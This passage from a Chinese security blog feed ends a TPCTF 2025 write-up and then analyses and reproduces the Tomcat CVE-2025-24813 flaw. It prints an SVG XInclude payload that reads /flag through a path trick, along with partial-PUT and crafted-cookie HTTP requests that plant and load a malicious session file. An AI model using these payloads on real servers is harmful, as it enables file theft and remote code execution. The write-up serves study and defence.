class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM pandoc/core:2.18-ubuntu</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y libexiv2-dev libboost-python-dev exiftool imagemagick git python3-pip libcurl4-openssl-dev libssl-dev</span><br><span class="line">RUN git clone --depth 1 https://gerrit.wikimedia.org/r/operations/software/thumbor-plugins</span><br><span class="line">RUN pip install -r thumbor-plugins/requirements.txt</span><br><span class="line">RUN dd if=thumbor-plugins/README.md of=thumbor.conf bs=1 count=1947 skip=610</span><br><span class="line">RUN echo TPCTF&#123;...&#125; &gt; /flag</span><br><span class="line">ENV PYTHONPATH=/data/thumbor-plugins</span><br><span class="line">ENTRYPOINT thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App</span><br></pre></td></tr></table></figure><p>我们先进docker把thumbor-plugins文件夹拉出来看看源码。</p><p>这道题的考点在这篇文章：<a href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/">https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/</a></p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(255,204,204);&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;.?../../../../../../../flag&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">encoding</span>=<span class="string">&quot;ASCII&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>file not found<span class="tag">&lt;/<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2025/03/30/TPCTF2025-wp/image-20250330160754286.png" class="" title="This is an example image"><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>好像是个0day，这里给出wp</p><p><a href="https://z3n1th1.com/2025/03/tpctf2025-writeup/#are-you-incognito">https://z3n1th1.com/2025/03/tpctf2025-writeup/#are-you-incognito</a></p><p><a href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-24813 Tomcat RCE 分析复现</title>
      <link href="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>参考文章：</p><p><a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></p><p><a href="https://github.com/iSee857/CVE-2025-24813-PoC/blob/main/Tomcat_CVE-2025-24813_RCE.py">https://github.com/iSee857/CVE-2025-24813-PoC/blob/main/Tomcat_CVE-2025-24813_RCE.py</a></p><p>看了奇安信社区的文章和大b哥的文章后，自己来复现一下。</p><p><strong>漏洞影响范围：</strong></p><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><blockquote><p>Tomcat RCE 前世今生</p><p>CVE-2017-12615 Tomcat PUT ⽂件上传</p><p>CVE-2020-9484：Tomcat Session 反序列化漏洞</p><p>CVE-2024-50379 ：Tomcat PUT 条件竞争⽂件上传</p></blockquote><p><strong>漏洞利用条件：</strong></p><p>该漏洞利用条件较为复杂，需同时满足以下四个条件：</p><ol><li>应用程序启用了DefaultServlet写入功能，该功能默认关闭</li><li>应用支持了 partial PUT 请求，能够将恶意的序列化数据写入到会话文件中，该功能默认开启</li><li>应用使用了 Tomcat 的文件会话持久化并且使用了默认的会话存储位置，需要额外配置</li><li>应用中包含一个存在反序列化漏洞的库，比如存在于类路径下的 commons-collections，此条件取决于业务实现是否依赖存在反序列化利用链的库</li></ol><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先搭建一个环境吧~</p><p><a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/src/">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/src/</a></p><p>加⼊默认的 DefaultServlet，将DefaultServlet的readonly配置为false，启用写入功能</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314183557217.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">       &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">       &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">   &lt;/init-param&gt;</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184417111.png" class="" title="This is an example image"><p>主要是加入如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这⼀步是开启 Tomcat 的 Session 储存功能</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314183628380.png" class="" title="This is an example image"><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来启动环境，在终端输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/catalina.bat run</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184505385.png" class="" title="This is an example image"><p>环境开启了，接下来我们使用yakit创建一个java利用链</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184049256.png" class="" title="This is an example image"><p>接下来创建一下我们的包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /xxxxx/session HTTP/1.1  </span><br><span class="line">Host: 192.168.131.32:8080  </span><br><span class="line">Content-Length: 1000  </span><br><span class="line">Content-Range: bytes 0-1000/1200  </span><br><span class="line"></span><br><span class="line">&#123;&#123;反序列化文件内容)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184946955.png" class="" title="This is an example image"><p>第二个包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1  </span><br><span class="line">Host: 192.168.131.32:8080  </span><br><span class="line">Cookie: JSESSIONID=.xxxxx</span><br></pre></td></tr></table></figure><p>我们先发送第一个包</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314185038055.png" class="" title="This is an example image"><p>发现这里会多出一个.xxxxx.session</p><p>接下来我们发送第二个包</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314185113105.png" class="" title="This is an example image"><h2 id="深入源码分析"><a href="#深入源码分析" class="headerlink" title="深入源码分析"></a>深入源码分析</h2><h3 id="文件上传部分DefaultServlet-doPut"><a href="#文件上传部分DefaultServlet-doPut" class="headerlink" title="文件上传部分DefaultServlet#doPut"></a>文件上传部分DefaultServlet#doPut</h3><p>javaweb还是太差了，搭个环境搭了半天。</p><p>先用idea搭建一个普通的tomcat环境，部署环境的时候要注意IDEA 部署 Tomcat 在新版有⼀些改变，主要是 AddFrameWork 按钮没了。全局搜即可。</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163558374.png" class="" title="This is an example image"><p>然后把tomcat源码中的lib中的jar包都粘贴到web项目的WEB-INF的lib中</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163524384.png" class="" title="This is an example image"><p>然后对lib进行add as library即可。</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163815741.png" class="" title="This is an example image"><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163824169.png" class="" title="This is an example image"><p>接着修改context.xml和web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来我们关注一下<strong>DefaultServlet</strong></p><p>⾃带的⼀个 Servelet 会处理⼀些默认类型的请求，如 PUT、POST、GET。</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321164415698.png" class="" title="This is an example image"><p>核心代码如下：CVE-2017-12615、CVE-2024-50379均涉及该⽅法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line">            <span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">                        resourceInputStream = req.getInputStream();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">                        resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, (InputStream)resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">204</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">201</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resp.sendError(<span class="number">409</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalStateException var15) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (resourceInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ((InputStream)resourceInputStream).close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们先审计一下这段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (this.readOnly) &#123;</span><br></pre></td></tr></table></figure><p>由于我们之前已经在web.xml中设置过了readonly为false，那么我们进入的就是else部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebResource resource = this.resources.getResource(path);</span><br></pre></td></tr></table></figure><p>这里获得的直接是web根目录，然后将⽂件上传，这也是最开始的 PUT ⽂件上传漏洞点。</p><p>然后我们继续往下看，遇到一个parseContentRange函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Range <span class="title function_">parseContentRange</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">contentRangeHeader</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Content-Range&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (contentRangeHeader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> IGNORE;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.allowPartialPut) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ContentRange</span> <span class="variable">contentRange</span> <span class="operator">=</span> ContentRange.parse(<span class="keyword">new</span> <span class="title class_">StringReader</span>(contentRangeHeader));</span><br><span class="line">            <span class="keyword">if</span> (contentRange == <span class="literal">null</span>) &#123;</span><br><span class="line">                response.sendError(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;bytes&quot;</span>.equals(contentRange.getUnits())) &#123;</span><br><span class="line">                response.sendError(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Range</span>();</span><br><span class="line">                range.start = contentRange.getStart();</span><br><span class="line">                range.end = contentRange.getEnd();</span><br><span class="line">                range.length = contentRange.getLength();</span><br><span class="line">                <span class="keyword">return</span> range;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该函数与访问头Content-Range有关。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Range">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Range</a></p><p>我们先看看语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Range: &lt;unit&gt; &lt;range-start&gt;-&lt;range-end&gt;/&lt;size&gt;</span><br><span class="line">Content-Range: &lt;unit&gt; &lt;range-start&gt;-&lt;range-end&gt;/*</span><br><span class="line">Content-Range: &lt;unit&gt; */&lt;size&gt;</span><br></pre></td></tr></table></figure><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;unit&gt;</span><br><span class="line">    指定范围的单位。通常是字节（bytes）。</span><br><span class="line">&lt;range-start&gt;</span><br><span class="line">    给定单位中的一个整数，表示所请求范围的起始位置（从零开始，包含起始位置）。</span><br><span class="line">&lt;range-end&gt;</span><br><span class="line">    给定单位中的一个整数，表示所请求范围的结束位置（从零开始，包含结束位置）。</span><br><span class="line">&lt;size&gt;</span><br><span class="line">    文档的总长度（如果未知，则为 &#x27;*&#x27;）。</span><br></pre></td></tr></table></figure><p>其实可以理解为和分块⼀个意思。</p><p>接下来我们简单上传一个session看看效果，用yakit就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /CVE_2025_24813_war_exploded/aaa/session HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Content-Range: bytes 0-1000/1200</span><br><span class="line"></span><br><span class="line">testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321170408444.png" class="" title="This is an example image"><p>start、end、length和请求头对应，随后会进⼊ executePartialPut 内。</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321170557353.png" class="" title="This is an example image"><p>这里的path.replace会将斜杠替换成点号，因此我们可以上传一个xxx.session文件，接下来看看具体处理逻辑。</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321170946544.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">randAccessContentFile.setLength(range.length);</span><br><span class="line">randAccessContentFile.seek(range.start);</span><br></pre></td></tr></table></figure><p>这里以将range.length设置为文件长度，以range.start开始处理文件流，也就是为什么length一定要大于body总长度的原因，否则文件无法正常上传。</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321175341985.png" class="" title="This is an example image"><p>上传后虽然返回的是409，但是文件确实是会上传的！</p><p>自此文件上传的部分便以完毕了。</p><p>接下来是反序列化触发点。</p><h3 id="反序列化触发点FileStore-load"><a href="#反序列化触发点FileStore-load" class="headerlink" title="反序列化触发点FileStore#load"></a>反序列化触发点FileStore#load</h3><p>这部分是反序列化触发点，CVE-2020-9484出⾃这⾥，所以不难看出这其实是⼀个组合漏洞，当时CVE-2020-9484是因为存在</p><p>⽬录穿越问题所以可以穿越加载⼀个⾃定义的序列化⽂件。</p><p>触发点如下：</p><blockquote><p>D:\code\CVE-2025-24813\web\WEB-INF\lib\catalina.jar!\org\apache\catalina\session\FileStore.class</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Session <span class="title function_">load</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.file(id);</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getManager().getContext();</span><br><span class="line">        <span class="type">Log</span> <span class="variable">contextLog</span> <span class="operator">=</span> context.getLogger();</span><br><span class="line">        <span class="keyword">if</span> (contextLog.isTraceEnabled()) &#123;</span><br><span class="line">            contextLog.trace(sm.getString(<span class="built_in">this</span>.getStoreName() + <span class="string">&quot;.loading&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id, file.getAbsolutePath()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">oldThreadContextCL</span> <span class="operator">=</span> context.bind(Globals.IS_SECURITY_ENABLED, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">            StandardSession var9;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ois = <span class="built_in">this</span>.getObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> (StandardSession)<span class="built_in">this</span>.manager.createEmptySession();</span><br><span class="line">                    session.readObjectData(ois);</span><br><span class="line">                    session.setManager(<span class="built_in">this</span>.manager);</span><br><span class="line">                    var9 = session;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ois.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                            var19.addSuppressed(var18);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var19;</span><br><span class="line">                